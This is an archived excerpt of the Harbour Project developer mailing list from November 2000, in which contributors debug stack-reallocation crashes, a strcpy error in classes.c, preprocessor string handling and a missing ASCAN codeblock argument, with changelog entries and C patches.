</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 11:45:03 2000
Date: Sun Nov  5 11:45:03 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (john)

<PRE>[To Paul Tucker]

&quot;Bison listed near the bottom of the download page at Harbour-Project.org=

is version 1.25&quot;

I didn't know it had changed.  Thanks!

Er... in another dir I find I have 1.28 &lt;g&gt; so will investigate a
bit more.  [later] tried 1.28 and it works OK with VC++ (without my
changes being needed).  So why is the Harbour one only 1.25? :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 11:45:17 2000
Date: Sun Nov  5 11:45:17 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in classes.c

<PRE>[To Jean]

Line 1603's strcpy() has an extra &quot;&amp;&quot; for param 1.  Thankfully VC++
diagnosed it, otherwise the result would be horrible!

John.

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 11:58:02 2000
Date: Sun Nov  5 11:58:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] bug in classes.c

<PRE>Thank John


&gt;<i> Line 1603's strcpy() has an extra &quot;&amp;&quot; for param 1.  Thankfully VC++
</I>&gt;<i> diagnosed it, otherwise the result would be horrible!
</I>
yes, :-(( stupid ...

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 11:58:10 2000
Date: Sun Nov  5 11:58:10 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-05 18:00 UTC+0100 JFL (mafact) <jfl@mafact.com>

<PRE>2000-11-05 18:00 UTC+0100 JFL (mafact) &lt;<A HREF="mailto:jfl@mafact.com">jfl@mafact.com</A>&gt;
   * source/vm/classes.c
     * strcpy( &amp;cString , ... in place of strcpy( cString, ... :-(((


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 12:05:04 2000
Date: Sun Nov  5 12:05:04 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>[To All]

As a slight simplification, Clipper's Extend API(s) such as _parc()
return a pointer which will remain valid until the code that called
it returns back to the pcode engine or calls _xunlock().

That makes using the Extend APIs fairly simple, and also helps the
code work.  Any GC/VM or similar activity does not affect the pointers
obtained.

I am getting the impression this is not true in Harbour, and if it
isn't that strikes me as a huge backward step.  If the reason it
isn't is to do with realloc'ing the Harbour stack, let's find a more
workable approach. &lt;g&gt;  The 64Mb idea looks a bit like overkill but
would perhaps be better than what looks to be the current situation.

BTW, What is the situation now if a C function calls something which
in turn calls back into the app, potentially repeating this calling
several levels deep (i.e. recursively) before the levels return?  If
pointers from _parc() aren't still valid in each of those levels, I
need to know!

John.

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 12:46:01 2000
Date: Sun Nov  5 12:46:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-05 18:39 GMT+1

<PRE>2000-11-05 18:39 GMT+1 Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
   * config/os2/gcc.cf
      + added support to -DSIMPLEX define required for SimpLex only code
added by Ron.
        The same change should be applied to /linux/gcc as well, but I
can't test it now,
        so I leave to unix users.
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 12:50:03 2000
Date: Sun Nov  5 12:50:03 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>On 5 Nov 2000, at 11:13, Maurilio Longo wrote:

&gt;<i> Antonio,
</I>&gt;<i> 
</I>&gt;<i> it would be dynamic. StackInit() reserves an uncommitted memory
</I>&gt;<i> address range (say 64Mb). This is only an address range, there is no
</I>&gt;<i> real memory used.
</I>
So, if you don't commit the memory, how do you insure that no 
other application works in that memory range?


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 12:53:01 2000
Date: Sun Nov  5 12:53:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Hi John,

just to clarify, when I say 64Mb I mean 64Mb of _addresses_ not memory.
You don't use real memory until after you start committing it.

Every win32, OS/2, linux process has at least 2Gb of addresses
available. So locking 64Mb is not that overkill (and your stack will
never move around).

regards.

PS. I know, OS/2 processes (before a certain kernel level) are limited
to 512Mb (or less) available addresses.

John Skelton ha scritto:
&gt;<i> 
</I>&gt;<i> [To All]
</I>&gt;<i> 
</I>&gt;<i> As a slight simplification, Clipper's Extend API(s) such as _parc()
</I>&gt;<i> return a pointer which will remain valid until the code that called
</I>&gt;<i> it returns back to the pcode engine or calls _xunlock().
</I>&gt;<i> 
</I>&gt;<i> That makes using the Extend APIs fairly simple, and also helps the
</I>&gt;<i> code work.  Any GC/VM or similar activity does not affect the pointers
</I>&gt;<i> obtained.
</I>&gt;<i> 
</I>&gt;<i> I am getting the impression this is not true in Harbour, and if it
</I>&gt;<i> isn't that strikes me as a huge backward step.  If the reason it
</I>&gt;<i> isn't is to do with realloc'ing the Harbour stack, let's find a more
</I>&gt;<i> workable approach. &lt;g&gt;  The 64Mb idea looks a bit like overkill but
</I>&gt;<i> would perhaps be better than what looks to be the current situation.
</I>&gt;<i> 
</I>&gt;<i> BTW, What is the situation now if a C function calls something which
</I>&gt;<i> in turn calls back into the app, potentially repeating this calling
</I>&gt;<i> several levels deep (i.e. recursively) before the levels return?  If
</I>&gt;<i> pointers from _parc() aren't still valid in each of those levels, I
</I>&gt;<i> need to know!
</I>&gt;<i> 
</I>&gt;<i> John.
</I>
--

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 13:09:02 2000
Date: Sun Nov  5 13:09:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Hi Phil,

you _reserve_ that memory range.

Under OS/2 you'd do more or less:

rc := DosAllocMem(pStack, 64Mb, pag_write);

this reserves to calling process a linear block of addresses 64Mb long.

When, later, you need to use some of this memory you call

rc := DosSetMem(pStack + some_delta, 4Kb, pag_commit);

This associates a &quot;real&quot; page of ram (4Kb) to the address specified,
that is now you are using 4Kb of memory and you can write to this piece
of ram without problems.

Under OS/2 threads' stack is handled this way so you can set it to, say,
8Mb, without any memory penalty until you really need that much of stack
space.

regards.

PS. I'm sure win32 and linux have similar possibilities regarding memory
usage.

Phil Barnett ha scritto:
&gt;<i> 
</I>&gt;<i> On 5 Nov 2000, at 11:13, Maurilio Longo wrote:
</I>&gt;<i> 
</I>&gt;<i> &gt; Antonio,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; it would be dynamic. StackInit() reserves an uncommitted memory
</I>&gt;<i> &gt; address range (say 64Mb). This is only an address range, there is no
</I>&gt;<i> &gt; real memory used.
</I>&gt;<i> 
</I>&gt;<i> So, if you don't commit the memory, how do you insure that no
</I>&gt;<i> other application works in that memory range?
</I>&gt;<i> 
</I>&gt;<i> --
</I>&gt;<i>               Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
</I>&gt;<i>                        WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
</I>&gt;<i>                   FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 13:14:02 2000
Date: Sun Nov  5 13:14:02 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

<PRE>This is a multi-part message in MIME format.

--Boundary_(ID_TKoO3hT+XB4HsNDrfjqBtg)
Content-type: text/plain; charset=iso-8859-1
Content-transfer-encoding: 7BIT

&gt;<i> As a slight simplification, Clipper's Extend API(s) such as _parc()
</I>&gt;<i> return a pointer which will remain valid until the code that called
</I>&gt;<i> it returns back to the pcode engine or calls _xunlock().
</I>&gt;<i>
</I>&gt;<i> That makes using the Extend APIs fairly simple, and also helps the
</I>&gt;<i> code work.  Any GC/VM or similar activity does not affect the
</I>pointers
&gt;<i> obtained.
</I>&gt;<i>
</I>&gt;<i> I am getting the impression this is not true in Harbour, and if it
</I>&gt;<i> isn't that strikes me as a huge backward step.  If the reason it
</I>&gt;<i> isn't is to do with realloc'ing the Harbour stack, let's find a more
</I>&gt;<i> workable approach. &lt;g&gt;  The 64Mb idea looks a bit like overkill but
</I>&gt;<i> would perhaps be better than what looks to be the current situation.
</I>&gt;<i>
</I>&gt;<i> BTW, What is the situation now if a C function calls something which
</I>&gt;<i> in turn calls back into the app, potentially repeating this calling
</I>&gt;<i> several levels deep (i.e. recursively) before the levels return?  If
</I>&gt;<i> pointers from _parc() aren't still valid in each of those levels, I
</I>&gt;<i> need to know!
</I>&gt;<i>
</I>&gt;<i> John.
</I>
John,

hb_parc() does not return a pointer to a stack itself but to a value
from an item stored in a stack. This implies that stack's reallocation
does not affect a pointer retruned by a hb_parc().
So Jean's fix to classes.c is unnesesary too complicated because he
could obtain a pointer to class name via a hb_parc() and use it
without copying a string to a local var (see attached __ClsInstSuper).

Regards
Marek Paliwoda






--Boundary_(ID_TKoO3hT+XB4HsNDrfjqBtg)
Content-type: application/octet-stream; name=Classes.c
Content-disposition: attachment; filename=Classes.c
Content-transfer-encoding: quoted-printable

HB_FUNC( __CLSINSTSUPER )=0A=
{=0A=
   BOOL bFound =3D FALSE;=0A=
=0A=
   if( hb_param( 1, HB_IT_STRING ) )=0A=
   {=0A=
      char *pString =3D hb_parc( 1 );=0A=
      PHB_DYNS pDynSym =3D hb_dynsymFind( pString );=0A=
=0A=
      if( pDynSym )                             /* Find function         =
   */=0A=
      {=0A=
         USHORT uiClass;=0A=
=0A=
         hb_vmPushSymbol( pDynSym-&gt;pSymbol );        /* Push function =
name       */=0A=
         hb_vmPushNil();=0A=
         hb_vmFunction( 0 );                         /* Execute super =
class      */=0A=
	 =0A=
         if( HB_IS_OBJECT( &amp;hb_stack.Return ) )=0A=
         {=0A=
            for( uiClass =3D 0; ! bFound &amp;&amp; uiClass &lt; s_uiClasses; =
uiClass++ )=0A=
            {                                      /* Locate the entry   =
      */=0A=
               if( hb_stricmp( pString, s_pClasses[ uiClass ].szName ) =
=3D=3D 0 )=0A=
               {=0A=
                  hb_retni( uiClass + 1 );               /* Entry + 1 =
=3D hb___msgClsH    */=0A=
                  bFound =3D TRUE;=0A=
               }=0A=
            }=0A=
         }=0A=
         else=0A=
            hb_errRT_BASE( EG_ARG, 3002, &quot;Super class does not return an =
object&quot;, &quot;__CLSINSTSUPER&quot; );=0A=
      }=0A=
      else=0A=
         hb_errRT_BASE( EG_ARG, 3003, &quot;Cannot find super class&quot;, =
&quot;__CLSINSTSUPER&quot; );=0A=
   }=0A=
=0A=
   if( ! bFound )=0A=
      hb_retni( 0 );=0A=
}=0A=

--Boundary_(ID_TKoO3hT+XB4HsNDrfjqBtg)--

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 13:34:02 2000
Date: Sun Nov  5 13:34:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Marek,

I believe you are 100% correct. Though there is 1 limitation on using a
pointer obtained using __parc(). In the Clipper implementation (not yet in
Harbour) multiple vars may be sharing the same pointer to a string value.
This is an optimization aspect and not a language feature. So, a C callable
function should *not* directly modify the value pointed to by the __parc()
pointer, instead __storc() should be used.

Ron

&gt;<i> John,
</I>&gt;<i>
</I>&gt;<i> hb_parc() does not return a pointer to a stack itself but to a value
</I>&gt;<i> from an item stored in a stack. This implies that stack's reallocation
</I>&gt;<i> does not affect a pointer retruned by a hb_parc().
</I>&gt;<i> So Jean's fix to classes.c is unnesesary too complicated because he
</I>&gt;<i> could obtain a pointer to class name via a hb_parc() and use it
</I>&gt;<i> without copying a string to a local var (see attached __ClsInstSuper).
</I>&gt;<i>
</I>&gt;<i> Regards
</I>&gt;<i> Marek Paliwoda
</I>

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 14:01:02 2000
Date: Sun Nov  5 14:01:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-05 19:52 GMT+1

<PRE>2000-11-05 19:52 GMT+1 Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
   * source/vm/hvm.c
      * I keep getting exceptions during class use due to harbour stack
management,
        so, until all code is checked and made compatible with harbour
stack I have
        increased
        STACK_INITHB_ITEMS      to 2000 (from 100)
        STACK_EXPANDHB_ITEMS    to 200  (20)
        This is only a temporary workaround. But, at least, I can use
harbour for my
        day to day work :-|
        This change should not make any difference but to DOS users.
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 14:01:09 2000
Date: Sun Nov  5 14:01:09 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Antonio ... stack base address + <n> stack items

<PRE>JF,

&gt;<i> Could you please just develop a bit this technic ?
</I>
hvm.c

void hb_vmDo( USHORT uiParams )
{
   ...
   LONG wStackBase;    &lt;&lt;&lt; Stack base index
   LONG wItemIndex;    &lt;&lt;&lt; Stack index position

   ...

   wStackBase = hb_stack.pBase - hb_stack.pItems; /* as the stack memory
block could change */
   wItemIndex = pItem - hb_stack.pItems;

   ...  (notice the above comment!!!)


   pItem-&gt;item.asSymbol.stackbase = wStackBase;

   ...

   while( hb_stack.pPos &gt; hb_stack.pItems + wItemIndex )
      hb_stackPop();

   hb_stack.pBase = hb_stack.pItems + wStackBase;  &lt;&lt;&lt; recover stack base
position

   ...
}


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 14:12:02 2000
Date: Sun Nov  5 14:12:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-05 10:00 UTC+0100 JFL (mafact) <jfl@mafact.com>

<PRE>Brian,

&gt;<i> Are these kinds of guidelines written down anywhere so those who weren't
</I>&gt;<i> around in the &quot;good old days&quot; can try to be aware of them?  
</I>
I am searching into harbour/doc/vm.txt and it is not commented.

It should be commented there or just implement a new stack.txt


Antonio


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 14:14:02 2000
Date: Sun Nov  5 14:14:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Harbour dynamic stack

<PRE>Brian,

hvm.c hb_stack...() functions should also become explained 
at a Harbour/doc/stack.txt


Antonio


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 14:21:02 2000
Date: Sun Nov  5 14:21:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio,

&gt;<i> if you need more than 64Mb (Mb not Kb) per thread of stack space your
</I>&gt;<i> algorithm is surely broken :-)))
</I>
Harbour dynamic stack functions are located at source\vm\hvm.c

Improvements on those functions are welcome :-)


Antonio

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 14:39:02 2000
Date: Sun Nov  5 14:39:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-05 19:52 GMT+1

<PRE>Maurilio

Could it be at __ObjSendMsg() ? Do you have more info, i'm trying 
to isolate all suspicious case :-((((


&gt;<i> 2000-11-05 19:52 GMT+1 Maurilio Longo &lt;<A HREF="mailto:maurilio.longo@libero.it">maurilio.longo@libero.it</A>&gt;
</I>&gt;<i>    * source/vm/hvm.c
</I>&gt;<i>       * I keep getting exceptions during class use due to harbour stack
</I>&gt;<i> management,
</I>&gt;<i>         so, until all code is checked and made compatible with harbour
</I>&gt;<i> stack I have
</I>&gt;<i>         increased
</I>&gt;<i>         STACK_INITHB_ITEMS      to 2000 (from 100)
</I>&gt;<i>         STACK_EXPANDHB_ITEMS    to 200  (20)
</I>&gt;<i>         This is only a temporary workaround. But, at least, I can use
</I>&gt;<i> harbour for my
</I>&gt;<i>         day to day work :-|
</I>&gt;<i>         This change should not make any difference but to DOS users.
</I>&gt;<i> -- 
</I>&gt;<i> 
</I>&gt;<i>  __________                   
</I>&gt;<i> |  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>&gt;<i> |_|_|_|____| Team OS/2 Italia
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 15:49:02 2000
Date: Sun Nov  5 15:49:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Maurilio...

<PRE>It appear very important I can strictly compile and use your 
program to debug this #@!!~# GPF... Have you any idea why I can' 
use the keyboard when I compile your app. ? The program run 
perfectly until I see the editor where I can type any chars, Enter 
and Esc but never F2 or F3. 

I think the bug could only appear when I call hb_vmFunction() or 
hb_vmDo(). So, the most probable defect function are 
__ClsInstSuper(), __ObjSendMsg() and  hb__MsgEvalInline().

Having read many other c source within harbour and trying to 
understand Antonio's infos :-/, I'm really not sure I badly use the 
stack... to be sure I must reproduce the problem... So ... go to 
point one ;-).

See you,

Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 16:19:02 2000
Date: Sun Nov  5 16:19:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio, Brian, and the other,

I think I've found the real problem. Somewhere, in classes.c 
(hb_ClsInst()), I store a c array of PHB_ITEM ( :-((( Yes now I know 
it's not a good idea...). I'm trying to find a better way to do the 
same job (working on relative item pos instead of the pointer itself 
(thank Antonio...) ). It could take one day or two (I'm really busy 
those last weeks &lt;g&gt;), so in the meantime, just keep the hvm.c 
modification of Maurilio wich should avoid a stack reallocation.

Thanks, 

&gt;<i> 
</I>&gt;<i> &gt; if you need more than 64Mb (Mb not Kb) per thread of stack space your
</I>&gt;<i> &gt; algorithm is surely broken :-)))
</I>&gt;<i> 
</I>&gt;<i> Harbour dynamic stack functions are located at source\vm\hvm.c
</I>&gt;<i> 
</I>&gt;<i> Improvements on those functions are welcome :-)
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> Antonio
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 17:22:01 2000
Date: Sun Nov  5 17:22:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Maurilio...

<PRE>Jean,

my program uses inkey() to fetch characters from keyboard so you should
receive them.

Please note that latest version (the one where tmysql.prg compiles
without mysql.c) will GPF as soon as a TBrowse starts to stabilize
because rows are empty (nil).

So this test version (tcase1.zip) stops in a way or another long before
it shows anything on screen.

regards.

JF Lefebvre ha scritto:
&gt;<i> 
</I>&gt;<i> It appear very important I can strictly compile and use your
</I>&gt;<i> program to debug this #@!!~# GPF... Have you any idea why I can'
</I>&gt;<i> use the keyboard when I compile your app. ? The program run
</I>&gt;<i> perfectly until I see the editor where I can type any chars, Enter
</I>&gt;<i> and Esc but never F2 or F3.
</I>&gt;<i> 
</I>&gt;<i> I think the bug could only appear when I call hb_vmFunction() or
</I>&gt;<i> hb_vmDo(). So, the most probable defect function are
</I>&gt;<i> __ClsInstSuper(), __ObjSendMsg() and  hb__MsgEvalInline().
</I>&gt;<i> 
</I>&gt;<i> Having read many other c source within harbour and trying to
</I>&gt;<i> understand Antonio's infos :-/, I'm really not sure I badly use the
</I>&gt;<i> stack... to be sure I must reproduce the problem... So ... go to
</I>&gt;<i> point one ;-).
</I>&gt;<i> 
</I>&gt;<i> See you,
</I>&gt;<i> 
</I>&gt;<i> Best regards,
</I>&gt;<i> 
</I>&gt;<i> J. Lefebvre,
</I>&gt;<i> Bruxelles,
</I>&gt;<i> Belgium
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 17:40:03 2000
Date: Sun Nov  5 17:40:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-05 14:40 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-05 14:40 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/pp/ppcore.c
     ! Fixed dropped redundant spaces in [] strings, by adding STATE_QUOTE3
to strotrim().
     ! Fixed conversion of string delimiters in getExpReal()


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 17:41:03 2000
Date: Sun Nov  5 17:41:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Embedded quotes  error on ['']

<PRE>&gt;<i> In summary, in Clipper PPed code you can *never* have the string 
</I>&gt;<i> [''], thus
</I>&gt;<i> when this PP bug will be fixed, your above bug will disappear.
</I>&gt;<i> 
</I>&gt;<i> Ron
</I>
Fixed!

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 17:42:01 2000
Date: Sun Nov  5 17:42:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] PP pulls spaces out of constant strings

<PRE>&gt;<i> Alexander:
</I>&gt;<i> If a string is in square brackets, all spaces around commas are 
</I>&gt;<i> stripped out
</I>&gt;<i> (it thinks it's an array subscript):
</I>&gt;<i> 
</I>&gt;<i> ? [test, comma   ,   3, 4] ==&gt; test,comma,3,4
</I>&gt;<i> 
</I>&gt;<i> Brian
</I>
Fixed!

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 20:20:04 2000
Date: Sun Nov  5 20:20:04 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] ASCAN should pass a second parameter to the  codeblock

<PRE>The second &quot;offset&quot; parameter is not being passed to the codeblock in ASCAN.
This was initially an undocumented arg, but I'm sure it was officially
sanctioned by CA at one point for both 5.2 and 5.3.
I've used it throughout my clipper code:

   ? ascan( {&quot;a&quot;, &quot;b&quot;, &quot;c&quot;}, {|E,i| qout(E), qout(i) })
&quot;i&quot; should be E's offset in the array.

Could someone _please_ add this?  (The hb_vmPushSymbol() code is not
something I'm yet familiar with.)

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 20:30:05 2000
Date: Sun Nov  5 20:30:05 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] ASCAN should pass a second parameter to the  codeblock

<PRE>Brian,


&gt;<i> The second &quot;offset&quot; parameter is not being passed to the codeblock in ASCAN.
</I>&gt;<i> This was initially an undocumented arg, but I'm sure it was officially
</I>&gt;<i> sanctioned by CA at one point for both 5.2 and 5.3.
</I>
You're right, it's missing from Harbour.

As a fix, change these lines in SOURCE/VM/ARRAYS.C/hb_arrayScan():
               hb_vmPushSymbol( &amp;hb_symEval );
               hb_vmPush( pValue );
               hb_vmPush( pBaseArray-&gt;pItems + ulStart );
               hb_vmDo( 1 );
To these:
               hb_vmPushSymbol( &amp;hb_symEval );
               hb_vmPush( pValue );
               hb_vmPush( pBaseArray-&gt;pItems + ulStart );
               hb_vmPushNumber( ( double ) ( ulStart + 1 ), 0 );
               hb_vmDo( 2 );

I haven't tested this, but it should work. If it really does, 
please feel free to commit it to the CVS. Thanks in advance.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 20:31:02 2000
Date: Sun Nov  5 20:31:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] PP pulls spaces out of constant strings

<PRE>Thanks for the quick fixes, Ron!!

Brian Hays
&gt;<i> &gt; If a string is in square brackets, all spaces around commas are 
</I>&gt;<i> &gt; stripped out
</I>&gt;<i> &gt; (it thinks it's an array subscript):
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; ? [test, comma   ,   3, 4] ==&gt; test,comma,3,4
</I>&gt;<i> 
</I>&gt;<i> Fixed!
</I>


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 20:35:03 2000
Date: Sun Nov  5 20:35:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] ASCAN should pass a second parameter to the  codeblock

<PRE>Thanks, Victor!   I will test it and commit when confirmed.

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 00:11:02 2000
Date: Mon Nov  6 00:11:02 2000
From: Paul Tucker harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (john)

<PRE>John,

The link on the downloads page has been fairly static for a while.  I'll go
looking for a more recent version, but if you have a link to where you got
it, that could help.

Once we have a more current source, Patrick (I believe) can update the page.

Paul
----- Original Message -----
From: &quot;John Skelton&quot; &lt;<A HREF="mailto:John_Skelton@compuserve.com">John_Skelton@compuserve.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Sunday, November 05, 2000 11:43 AM
Subject: Re: [Harbour] bug in GET (john)


[To Paul Tucker]

&quot;Bison listed near the bottom of the download page at Harbour-Project.org
is version 1.25&quot;

I didn't know it had changed.  Thanks!

Er... in another dir I find I have 1.28 &lt;g&gt; so will investigate a
bit more.  [later] tried 1.28 and it works OK with VC++ (without my
changes being needed).  So why is the Harbour one only 1.25? :-)

John.



</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 09:08:02 2000
Date: Mon Nov  6 09:08:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>[To Ron]

&quot;a C callable
function should *not* directly modify the value pointed to by the __parc(=
)
pointer, instead __storc() should be used.&quot;

Yes, unless the caller passed it by ref. (@cStr), in which case it's
OK to modify it directly.  (It's also OK to use _storc() of course,
though rather wasteful.)  FWRITE() is an example, in the sense that
this general rule applies to it just as it applies to other C code
(i.e. FWRITE() is not special).

John.

</PRE>

From harbour@lists.harbour-project.org  Mon Nov  6 09:08:11 2000
Date: Mon Nov  6 09:08:11 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re : dynsym.c caused GPF

